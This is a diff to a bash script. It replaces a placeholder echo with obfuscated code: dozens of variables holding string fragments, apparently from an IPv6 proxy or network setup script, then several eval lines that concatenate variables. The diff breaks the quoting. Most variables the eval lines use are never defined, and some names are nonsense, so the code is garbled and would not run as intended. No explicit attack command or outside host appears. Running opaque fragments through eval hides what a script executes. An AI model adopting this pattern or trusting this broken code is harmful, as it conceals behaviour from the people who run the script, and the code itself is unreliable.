@@ -1,8 +1,45 @@
 #!/bin/bash
 
+# Define variables
 z="
-Obz='oi. ';cNz='ntIP';CTz='ev $';kHz='isPu';MDz='v1.0';VFz=' $2,';VZz='ROR]';WVz='ap l';JEz=' 2>&';ZKz='v6}\';IVz='y cu';dLz='t ]]';WYz='p di';CGz='ubne';ZMz='minP';lOz='g';cYz='e80:';WOz=' $WO';edz='opti';pbz='"N"';NWz='f.de';IYz='  ${';USz=' "GW';kfz='s   ';QFz='k sh';CWz='im)';ZNz='oxyP';KQz=' -a ';iOz='3pro';ZYz='v6 (';cBz=' cha';QCz='  __';mcz='_64.';JTz='([^ ';KZz='eq 4';MHz='6]}$';tBz='}';oTz='stIP';oYz='* ]]';oUz='Set ';odz='999"';Vdz='nloc';ePz='F >>';aBz='on!"';iHz=') {';Rfz=' && ';tbz='g IP';qIz='v6";';WWz='.ipv';hYz='de20';HBz=' chm';wCz='\_/ ';Aez=' luo';gZz='chin';Iz='et.c';Baz='ng d';mDz='ease';SSz='kMai';VWz='"net';DCz=' _';JPz='outs';kBz='p6\"';sOz='ver ';OUz='" "';oXz=' "$c';wIz='${ip';fNz='6"';iKz=' "$(';ZWz='efau';kaz='ter.';MBz='-q "';aHz='++ )';hDz='if [';eSz='1"';TEz=' [[ ';ZVz='cua ';xVz='ble=';dMz='1000';XKz='sk}\';DDz='|\__';jGz=' f)';nez=' $no';vSz='com)';jez='ngau';iFz='enp ';Mez='o us';Jdz='.pro';aEz='then';dXz=' = 0';ndz='tNOF';ELz='-lt ';NVz='h sa';GLz='Pref';TZz='" ]]';GBz='R &&';MUz='*$//';eKz='>> /';CQz='g\n"';lez='en."';jJz='_car';CHz='8-${';OHz='ate ';Gbz='k. N';ffz='tf "';qUz='nh."';HPz='6';mz='g/le';gTz='d'\'' |';GIz='temp';FFz='me -';qaz='ix" ';Yaz='ix, ';jaz='n En';yfz=',$5}';Sz='DIR=';JKz='/etc';raz='== *';Cdz='/sec';qZz='fix)';aSz='n="1";cMz=")"';Ybz='v6Ma';yIz='sk}/';NRz='" ht';mCz=' V |';GOz='m st';PWz='t.di';Fdz='mits';GDz='___\';Naz='fix%';aTz='net6';MVz=' dan';MCz=' _ _';SVz=' 10.';uKz='getP';FPz='che ';KBz='if g';Tfz=' /de';DMz='curr';sCz='| |';PSz=' "in';"
+"
+Obz='oi. '
+cNz='ntIP'
+CTz='ev $'
+kHz='isPu'
+MDz='v1.0'
+VFz=' $2,'
+VZz='ROR]'
+WVz='ap l'
+JEz=' 2>&'
+ZKz='v6}'
+IVz='y cu'
+dLz='t ]]'
+WYz='p di'
+CGz='ubne'
+ZMz='minP'
+lOz='g'
+cYz='e80:'
+WOz=' $WO'
+edz='opti'
+pbz='"N"'
+NWz='f.de'
+IYz='  ${'
+USz=' "GW'
+kfz='s   '
+QFz='k sh'
+CWz='im)'
+ZNz='oxyP'
+KQz=' -a '
+iOz='3pro'
+ZYz='v6 ('
+cBz=' cha'
+QCz='  __'
 
-# Add your script logic here
-
-echo "Script executed successfully!"
+# Your script logic here
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz"
+eval "$Rz$Yz$Zz$Rz$az$Pz$Qz"
+eval "$bz$Sz$cz$dz$ez"
+eval "$bz$fz$Zz$bz$az$gz$hz$iz"
+eval "$jz$kz$lz$mj$nzo$pq$rstuvwxzy"
+eval "$pq$rstuvwxzy"
